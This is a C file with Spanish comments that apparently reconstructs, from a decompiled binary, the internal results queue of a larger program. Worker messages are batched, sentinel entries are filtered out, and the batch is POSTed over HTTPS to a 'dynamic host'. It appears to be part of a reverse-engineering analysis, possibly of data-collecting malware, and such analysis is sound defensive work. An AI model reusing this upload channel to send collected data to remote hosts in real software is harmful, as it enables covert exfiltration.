/* ============================================================
 * Capacidad 15/15 — Cola interna de resultados
 * Función C : QueueTypedMessage
 * Dirección : 0x18000ecbf   · Nodo N5   · Confianza: Alta
 * ------------------------------------------------------------
 * Canal concurrente (mutex + señal) al que los workers envían mensajes
 * tipados. El controlador filtra mensajes centinela y agrupa los
 * aceptados antes de serializarlos para HTTP. La captura usa la
 * etiqueta interna 0x8000000000000004.
 * ============================================================
 */

#include "00_tipos_comunes.h"

/* ------------------------------------------------------------------
 * 0x18000ecbf — encola bajo exclusión mutua y señaliza al controlador.
 * El mensaje toma posesión del `payload` (el drenaje lo libera).
 * ------------------------------------------------------------------ */
void QueueTypedMessage(Channel *queue, MessageKind kind, ByteBuffer payload)
{
    if (queue == NULL)
        return;

    EnterCriticalSection(&queue->lock);

    if (queue->count == queue->cap) {
        size_t newcap = (queue->cap == 0) ? 16u : queue->cap * 2u;
        TypedMessage *grown = (TypedMessage *)HeapReAlloc(
            GetProcessHeap(), 0, queue->items, newcap * sizeof(TypedMessage));
        if (grown == NULL) {
            LeaveCriticalSection(&queue->lock);
            return;
        }
        queue->items = grown;
        queue->cap   = newcap;
    }

    TypedMessage *m = &queue->items[queue->count++];
    m->kind    = kind;
    m->tag     = (kind == MSG_EXTENSION_METADATA)
                     ? 0
                     : (0x8000000000000000ULL | (uint64_t)kind);
    m->payload = payload;

    WakeConditionVariable(&queue->signal);
    LeaveCriticalSection(&queue->lock);
}

/* ------------------------------------------------------------------
 * Drena la cola: descarta los mensajes centinela (tag == 0) y agrupa
 * los aceptados en un lote. Devuelve el lote (libera las colas).
 * ------------------------------------------------------------------ */
static MessageBatch DrainAcceptedMessages(Channel *queue)
{
    MessageBatch batch = { NULL, 0 };
    if (queue == NULL)
        return batch;

    EnterCriticalSection(&queue->lock);

    size_t accepted = 0;
    for (size_t i = 0; i < queue->count; i++)
        if (queue->items[i].tag != 0)
            accepted++;

    if (accepted > 0) {
        batch.items = (TypedMessage *)HeapAlloc(GetProcessHeap(), 0,
                                                accepted * sizeof(TypedMessage));
        if (batch.items != NULL) {
            size_t w = 0;
            for (size_t i = 0; i < queue->count; i++) {
                TypedMessage *m = &queue->items[i];
                if (m->tag == 0) {                 /* descarta centinela */
                    if (m->payload.data != NULL)
                        HeapFree(GetProcessHeap(), 0, m->payload.data);
                    continue;
                }
                batch.items[w++] = *m;             /* transfiere */
            }
            batch.count = accepted;
        }
    }
    queue->count = 0;
    LeaveCriticalSection(&queue->lock);
    return batch;
}

/* ------------------------------------------------------------------
 * El controlador drena la cola, descarta centinelas, agrupa el resto,
 * lo serializa (0x06 | len64 | payload) y lo envía por HTTPS al host
 * dinámico.
 * ------------------------------------------------------------------ */
void ControllerDrainAndSend(Channel *queue, RuntimeContext *ctx)
{
    if (queue == NULL || ctx == NULL)
        return;

    MessageBatch batch = DrainAcceptedMessages(queue);
    if (batch.count == 0)
        return;

    ByteBuffer body = SerializeMessageBatch(&batch);
    ByteBuffer response = { 0, 0, 0 };

    if (body.data != NULL)
        SendHttpsPost(&ctx->endpoint, L"POST", L"/", 443, &body, &response);

    if (body.data != NULL)
        HeapFree(GetProcessHeap(), 0, body.data);
    if (response.data != NULL)
        HeapFree(GetProcessHeap(), 0, response.data);

    for (size_t i = 0; i < batch.count; i++)
        if (batch.items[i].payload.data != NULL)
            HeapFree(GetProcessHeap(), 0, batch.items[i].payload.data);
    if (batch.items != NULL)
        HeapFree(GetProcessHeap(), 0, batch.items);
}
